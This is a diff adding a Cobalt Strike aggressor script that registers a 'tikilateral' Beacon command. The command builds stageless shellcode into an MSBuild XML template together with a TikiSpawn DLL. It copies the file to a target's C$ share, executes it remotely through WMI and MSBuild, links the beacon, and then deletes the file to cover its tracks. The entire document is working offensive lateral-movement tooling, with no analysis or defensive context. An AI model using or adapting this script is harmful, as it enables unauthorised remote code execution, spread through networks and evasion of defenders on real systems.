@@ -1,0 +1,144 @@
+alias tikilateral {
+	
+	$bid = $1;
+
+	$input = substr($0, 12);
+	@args = split(' ', $input);
+
+	#########################
+	## Check args[] length ##
+	#########################
+
+	if (size(@args) eq "4") {
+
+		$target = @args[0];
+		$listener = @args[1];
+		$arch = @args[2];
+		$binary = @args[3];
+
+	}
+
+	println("[DEBUG] target: " . $target);
+	println("[DEBUG] listener: " . $listener);
+	println("[DEBUG] arch: " . $arch);
+	println("[DEBUG] binary: " . $binary);
+
+	############
+	## Errors ##
+	############
+
+	if (listener_info($listener, "payload") eq "") {
+		berror($bid, "Invalid listener");
+		return;
+	}
+
+	if (($arch ne "x64") && ($arch ne "x86")) {
+		berror($bid, "Invalid architecture");
+		return;
+	}
+
+	btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " on " . $target . " using " . $method);
+
+	###############
+	## Shellcode ##
+	###############
+
+	artifact_stageless($listener, "raw", $arch, $null, $this);
+	yield;
+	$shellcode = base64_encode($1);
+
+	##################
+	## Prep Payload ##
+	##################
+
+	$dllPath = getFileProper(script_resource("Templates"), "TikiSpawn.dll");
+
+	$template = getFileProper(script_resource("Templates"), "TikiSpawn.xml");
+	println("[DEBUG] dll: " . $dllPath);
+	println("[DEBUG] template: " . $template);
+	
+	$final = data_swap($binary, $shellcode, $dllPath, $template);
+
+	##################
+	## Gen Filename ##
+	##################
+
+	@characters = @("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9");
+
+	$filename = "";
+
+	for ($i = 0; $i < 9; $i++) {
+		$filename = $filename . rand(@characters);
+	}
+
+	$filename = $filename . ".xml";
+
+	println("[DEBUG] filename: " . $filename);
+
+	####################
+	## Upload and Run ##
+	####################
+
+	bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\ $+ $filename $+ ", $final);
+
+	if ($arch eq "x64") {
+		$buildPath = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe";
+	} else if ($arch eq "x86") {
+		$buildPath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe";
+	}
+
+	$cmd = "wmic /node:\" $+ $target $+ \" process call create \" $+ $buildPath  $+ C:\\Windows\\Temp\\ $+ $filename $+ \"";
+	println("[DEBUG] cmd: " . $cmd);
+
+	brun!($bid, $cmd);
+	bpause!($bid, 3000);
+	blink!($bid, $target);
+
+	#################
+	## Remove File ##
+	#################
+
+	brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\ $+ $filename $+ ");
+
+}
+
+sub data_swap {
+	
+	$binary = $1;
+	$shellcode = $2;
+	$dllPath = $3;
+	$template = $4;
+
+	$handle = openf($dllPath);
+	$dll = base64_encode(readb($handle, -1));
+
+	if (-canread $template) {
+
+		$handle = openf($template);
+		@data = readAll($handle);
+		closef($handle);
+		remove(@data, @data[21]);
+		add(@data, "            public const string binary = @\" $+ $binary $+ \"\;", 21);
+		remove(@data, @data[22]);
+		add(@data, "            public const string shellcode = @\" $+ $shellcode $+ \"\;", 22);
+		remove(@data, @data[23]);
+		add(@data, "            public const string dll = @\" $+ $dll $+ \"\;", 23);
+
+		$data = "";
+
+		for ($i = 0; $i < size(@data); $i++) {
+			$data = $data . @data[$i] . "\r\n";
+		}
+	}
+
+	return $data;
+}
+
+beacon_command_register (
+
+	"tikilateral",
+	"Use WMI to run a TikiSpawn payload on a host",
+	"Copy an XML TikiSpawn payload to the remote target\n" .
+	"and execute it using MSBuild via WMI.\n\n" .
+	"Use: tikilateral [target] [listener] [x64|x86] [binary]"
+);
